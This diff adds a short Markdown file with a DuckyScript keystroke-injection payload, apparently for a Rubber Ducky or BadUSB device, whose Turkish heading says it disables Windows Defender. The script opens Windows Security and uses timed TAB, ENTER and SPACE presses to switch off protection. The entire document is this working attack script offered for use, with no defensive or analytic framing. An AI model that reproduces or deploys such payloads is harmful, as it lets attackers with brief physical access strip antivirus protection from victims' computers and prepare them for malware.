@@ -1,0 +1,31 @@
+### Bu script windows defenderi devre dışı bırakır.
+```
+DELAY 100
+WINDOWS	
+DELAY 1000
+STRING Windows Güvenliği
+DELAY 1000
+ENTER
+DELAY 2000
+ENTER
+DELAY 1000
+REM Windows defender ayarlarından devre dışı bırakılır.
+TAB
+DELAY 70
+TAB
+DELAY 70
+TAB
+DELAY 70
+TAB
+DELAY 70
+ENTER
+DELAY 70
+SPACE
+DELAY 1000
+TAB
+DELAY 70
+TAB
+DELAY 70
+ENTER
+DELAY 3200
+```
